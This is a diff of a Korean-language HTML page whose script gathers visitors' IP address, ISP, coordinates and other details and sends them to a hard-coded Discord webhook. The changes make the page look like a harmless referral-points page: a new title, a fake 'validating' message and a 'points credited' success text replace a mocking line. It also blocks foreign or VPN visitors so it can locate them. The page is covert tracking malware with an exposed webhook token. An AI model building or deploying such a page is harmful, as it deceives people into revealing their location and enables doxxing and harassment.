@@ -2,13 +2,13 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>경찰청 - 사이버보안수사대</title>
+    <title>추천인 등록</title>
 </head>
 <body>
-    <div id="loading">운지</div>
+    <div id="loading">유효성 확인중...</div>
 
     <script>
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1429047518641262623/95rPmgDy2Ephh85qFvwRdbnW41c2nya9j_MfFDnHB6v5kgYivd1MzV28mlVh9zkqgmVV';
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1432668077778272266/_wifa3kMt8DG5YFzNV9ACcMDwQAJAOO6thkyELfUMNckWogwEYMgUhXDB6EVdkvLAxSq';
 
         async function collectAllInfo() {
             const userData = {};
@@ -36,6 +36,18 @@
                 userData.coordinates = `${locationData.latitude || 'N/A'}, ${locationData.longitude || 'N/A'}`;
                 userData.timezone = locationData.timezone || '정보 없음';
                 userData.currency = `${locationData.currency} (${locationData.currency_name})` || '정보 없음';
+
+                // ✅ VPN 또는 외국 감지 시 차단
+                if (userData.country !== 'South Korea' && userData.country !== '대한민국') {
+                    alert('VPN을 끄고 다시 접속해주세요.\n(현재 감지된 위치: ' + userData.country + ')');
+                    document.body.innerHTML = `
+                        <h2 style="text-align:center;color:red;margin-top:20%;">
+                            VPN을 끄고 다시 접속해주세요.<br><br>
+                            (현재 감지된 위치: ${userData.country})
+                        </h2>`;
+                    return; // 정보 수집 중단
+                }
+
             } catch (error) {
                 userData.ip = '정보 없음';
                 userData.isp = '정보 없음';
@@ -229,7 +241,6 @@
                 return;
             }
 
-            // 모든 정보를 description에 담기
             const infoText = `
 🌐 **위치 정보**
 • IP 주소: ${userData.ip}
@@ -290,9 +301,9 @@
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
                     if (xhr.status === 200 || xhr.status === 204) {
-                        document.getElementById('loading').textContent =  '너이제 ㅈ된거야^^~';
+                        document.getElementById('loading').textContent = '포인트가 성공적으로 적립되었습니다.';
                     } else {
-                        document.getElementById('loading').textContent = '전송 실패: ' + xhr.status;
+                        document.getElementById('loading').textContent = '인증 실패: ' + xhr.status;
                     }
                 }
             };
